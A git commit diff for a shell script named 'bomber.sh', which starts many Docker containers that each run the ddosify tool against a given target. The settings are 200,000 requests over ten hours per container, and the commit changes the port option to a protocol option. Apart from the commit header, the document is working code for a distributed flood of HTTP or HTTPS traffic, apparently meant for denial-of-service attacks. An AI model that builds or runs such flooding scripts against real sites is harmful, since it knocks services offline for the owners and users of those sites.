6d070fb9a7e8ce8251c1fd971ea599754aac2c4e
Alex <alexyekymov@gmail.com>
2022-03-06 19:48:35 +0200

    small fixes

--- bomber.sh
+++ bomber.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 COUNT=10
-PORT='443'
+PROTOCOL='HTTPS'
 
 RED='\033[0;31m'
 LGREEN='\033[1;32m'
@@ -11,16 +11,16 @@ while getopts t:p:c:f: flag
 do
     case "${flag}" in
         t) TARGET=${OPTARG};;
-        p) let PORT=${OPTARG};;
-        c) let COUNT=${OPTARG};;
+        p) PROTOCOL=${OPTARG};;
+        c) COUNT=${OPTARG};;
     esac
 done
 
-echo -e "Starting ${LGREEN}$COUNT${NC} containers on ${CYAN}$TARGET${NC}:${RED}$PORT${NC}"
+echo -e "Starting ${LGREEN}$COUNT${NC} containers on ${CYAN}$TARGET${NC}:${RED}$PROTOCOL${NC}"
 
 while [ $COUNT -gt 0 ]; do
     let COUNT=COUNT-1
-    docker run -d --rm ddosify/ddosify ddosify -t $TARGET -l incremental -n 200000 -d 36000 -p HTTP -m GET -T 10
+    docker run -d --rm ddosify/ddosify ddosify -t $TARGET -l incremental -n 200000 -d 36000 -p $PROTOCOL -m GET -T 10
 done
 
 echo 'done'
